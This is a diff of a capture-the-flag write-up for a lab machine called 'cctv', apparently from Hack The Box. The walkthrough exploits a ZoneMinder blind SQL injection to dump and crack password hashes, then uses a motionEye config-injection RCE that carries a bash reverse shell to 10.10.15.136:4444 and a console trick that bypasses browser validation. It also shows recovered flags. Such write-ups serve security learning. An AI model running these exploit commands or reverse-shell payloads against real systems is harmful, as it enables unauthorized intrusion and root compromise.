@@ -18,27 +18,32 @@ Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Mar 22 12:45:52 2026 -- 1 IP address (1 host up) scanned in 77.14 seconds
 ```
-- found two open ports lets see what we can found on port 80.
-- When tried to visit the site it redirected to a domain **cctv.htb** . add it to /etc/hosts
+- found two open ports lets see what we can find on port 80.
+- When I tried to visit the site, it redirected to a domain **cctv.htb**. Add it to /etc/hosts
 
 ```
 echo "10.129.244.156 cctv.htb" | sudo tee -a "/etc/hosts"   
 ```
 
-- on visiting the site we can see the a advertising site about security solutions . there we can see a login portal .**staff login** on top right.
-![screenshot](/data/cctv1.png)
-![screenshot](/data/cctv2.png)
-- we can find a ZoneMinder login page. well i tried to use default creds **admin:admin**
+- On visiting the site, we can see an advertising site about security solutions. There we can see a login portal .**staff login** on the top right.
+
+![screenshot](Data/cctv1.png)
+
+![screenshot](Data/cctv2.png)
+
+- We can find a ZoneMinder login page. Well, I tried to use default creds **admin:admin**
 
 - bhoom! logged in.
 
 - Zoneminder is a full-featured, open source, state-of-the-art video surveillance software system. Monitor your home, office, or wherever you want.
 
-- After logged in we can fnd the version **v1.37.63**
-![screenshot](/data/cctv3.png)
-- The above version is vulnerabile to blind-sql-injection [CVE-2024-51482](https://github.com/BridgerAlderson/CVE-2024-51482/tree/main)
-- The bug is caused due to the tid perameter is directly used in the sql query . you can find detailed explanation in the above github page along with a python poc script. 
-- I downloaded the sscript. if you want you can even use sqlmap.
+- After logging in, we can find the version **v1.37.63**
+  
+![screenshot](Data/cctv3.png)
+
+- The above version is vulnerable to blind SQL injection [CVE-2024-51482](https://github.com/BridgerAlderson/CVE-2024-51482/tree/main)
+- The bug is caused by the tid parameter being directly used in the SQL query. You can find a detailed explanation on the above GitHub page, along with a python poc script. 
+- I downloaded the script. If you want, you can even use SQLmap.
 
 ```
 python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --test
@@ -54,7 +59,7 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --test
 [+] Target is vulnerable!
 [+] Target is vulnerable!
 ```
-- from the output we can see the server is vulnerable . let try to dump the databases. 
+- From the output, we can see the server is vulnerable. let try to dump the Databases. 
 
 ```
 python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --discover                   8s
@@ -68,10 +73,10 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --discover              
 [*] Testing vulnerability with 2s sleep...
 [*] Response time: 2.26s
 [+] Target is vulnerable!
-[*] Enumerating databases...
-[+] Found database: information_schema                                           #
-[+] Found database: performance_schema
-[+] Found database: zm
+[*] Enumerating Databases...
+[+] Found Database: information_schema                                           #
+[+] Found Database: performance_schema
+[+] Found Database: zm
 
 [+] Databases found:
   1. information_schema                                           #
@@ -79,7 +84,7 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --discover              
   3. zm
 ```
 
-- zm looks odd , lets try to see what it got.
+- zm looks odd, let's try to see what it got.
 
 ```
  python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --tables zm             18m 10s
@@ -141,8 +146,8 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --discover              
 [+] Found table: P           
 ```
 
-- Lets try to dump users table it may contains some juciey information likes passwords etc.. 
-- well first we dump the coulumn names of uers table
+- Let's try to dump the users table; it may contain some juicy information like passwords. 
+- Well, first, let's dump the column names of the users table
 
 
 ```
@@ -179,7 +184,7 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --columns zm Users
 [+] Found column: TokenMinExpiry
 [+] Found column: Username
 ```
-- Usernaem and password hah! lets dump it!
+- Username and password, hah! Let's dump it!
 
 ```
 python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --dump zm Users "Username,Password"     
@@ -193,15 +198,17 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --dump zm Users "Usernam
 [*] Testing vulnerability with 2s sleep...
 [*] Response time: 2.25s
 [+] Target is vulnerable!
-[*] Dumping data from 'zm.Users'...
+[*] Dumping Data from 'zm.Users'...
 [*] Row 1: {'Username': 'admin                                                                                                                           ', 'Password': '$2y$10$cmytVWFRnt1XfqsJtsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm                                                             ,      '}
 [*] Row 2: {'Username': 'mark                                                                                                                            ', 'Password': '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.                                                                    '}
 [*] Row 3: {'Username': 'superadmin                                                                                          #                           ', 'Password': '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM8m                                                                    '}
 ```
--  we found some user hashes . 
-![screenshot](/data/cctv4.png)
-- form the above screenshot we can see the hases are bcrypt type.
-- I copied the hashses to a file hashes.txt, and try to crack using john with rockyou.txt and i found password for user mark
+-  We found some user hashes.
+  
+![screenshot](Data/cctv4.png)
+
+- From the above screenshot, we can see the hashes are bcrypt type.
+- I copied the hashes to a file, hashes.txt, and tried to crack using John with rockyou.txt, and I found the password for the user mark
 ```
 ohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -212,8 +219,8 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 opensesame       (?)     
 ```
 - Lets login **mark:opensesame**
-- On mark user profile, I didn't find anything intresting.
-- Tried login via ssh using mark creds and bhoom! we got into the system as mark
+- On Mark's user profile, I didn't find anything interesting.
+- Tried login via SSH using mark creds and bhoom! We got into the system as Mark
 ```
 ssh mark@cctv.htb
 The authenticity of host 'cctv.htb (10.129.51.209)' can't be established.
@@ -267,7 +274,7 @@ root:x:0:0:root:/root:/bin/bash
 mark:x:1000:1000:mark:/home/mark:/bin/bash
 sa_mark:x:1001:1001::/home/sa_mark:/bin/sh
 ```
-- After a while i tried checking listening port and found some 
+- After a while, I tried checking the listening port and found some 
 
 ```
 ss -alt
@@ -286,19 +293,23 @@ LISTEN                      0                           4096                    
 LISTEN                      0                           511                                                           *:http                                                          *:*                                                      
 LISTEN                      0                           4096                                                       [::]:ssh                                                        [::]:*        
 ```
-- Well i tried port forwarding to access those ports .
+- Well, I tried port forwarding to access those ports.
 ```
 ssh -L 8765:cctv.htb:8765 mark@cctv.htb
 ```
-- i used local portforwarding using ssh .that make a tunner between our local port 8765 and the remote port 8765.
+- I used local port forwarding using ssh .that make a tunnel between our local port 8765 and the remote port 8765.
 - Now tried to access it from our browser using http://localhost:8765
-![screenshot](/data/cctv5.png) 
-- The port 8765 contians a motionEye interface(motionEyeOS is a free, open-source Linux distribution designed to transform a single board computer like a Raspberry Pi into a powerful video surveillance system.)
-- On further investigation . I found version number in the viewsource .
-![screenshot](/data/cctv6.png) 
+
+![screenshot](Data/cctv5.png) 
+
+- The port 8765 contains a motionEye interface(motionEyeOS is a free, open-source Linux distribution designed to transform a single board computer like a Raspberry Pi into a powerful video surveillance system.)
+- On further investigation. I found the version number in the view source.
+
+![screenshot](Data/cctv6.png) 
+
 - The system runnin motionEye of version 4.7.1 which is vulnerable to [CVE-2025-60787](https://github.com/advisories/GHSA-j945-qm58-4gjx) .
--  This cve is a authenticated RCE . MotionEye writes user-supplied values directly into Motion configuration files without sanitization, so we can inject shell syntax to get code execution. for more information go to the above github page.
-- Before that i have to login. so i stareted searching for config files of motionEye
+-  This CVE is an authenticated RCE. MotionEye writes user-supplied values directly into Motion configuration files without sanitization, so we can inject shell syntax to get code execution. For more information, go to the above GitHub page.
+- Before that, I have to log in. So I started searching for the config files of motionEye
 
 ```
 find /etc/ -name '*motion*'
@@ -337,7 +348,7 @@ webcontrol_parms 2
 
 camera camera-1.conf
 ```
-- Whoop! whoop! we found the creds **admin:989c5a8ee87a0e9521ec81a79187d162109282f0**
+- Whoop! whoop! We found the creds **admin:989c5a8ee87a0e9521ec81a79187d162109282f0**
 
 ```
 cat /etc/systemd/system/multi-user.target.wants/motioneye.service
@@ -356,20 +367,22 @@ Restart=on-abort
 [Install]
 WantedBy=multi-user.target
 ```
-- as you can see the service is running a root . so lets get our root shell using the RCE vulnerability.
-- Well lets test i tried to get revshell using the below command
+- As you can see, the service is running as root. So let's get our root shell using the RCE vulnerability.
+- Well, let's test. I tried to get revshell using the below command
 ```
 $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.136/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
 ```
-- but the code is being block by browser side validation .
- ![screenshot](/data/cctv7.png) 
-- it can be simply bypassed by the folloing command .
+- but the code is being blocked by browser-side validation JavaScript.
+  
+ ![screenshot](Data/cctv7.png)
+ 
+- It can be simply bypassed by the following command.
 ```
 configUiValid = function() { return true; };
 ```
-- open developer tools and run the above in the console
+- Open developer tools and run the above in the console
 
-- Now lets get our revshell
+- Now, let's get our revshell
 ```
 $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.136/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
 ```
@@ -389,4 +402,5 @@ root@cctv:/etc/motioneye#
 ```
 
 **user.txt:6c48bd34914c879bd75e72ef1c94d981**
+
 **Root.txt:0556c926219fb7c9ec66bcf8acfce35a**
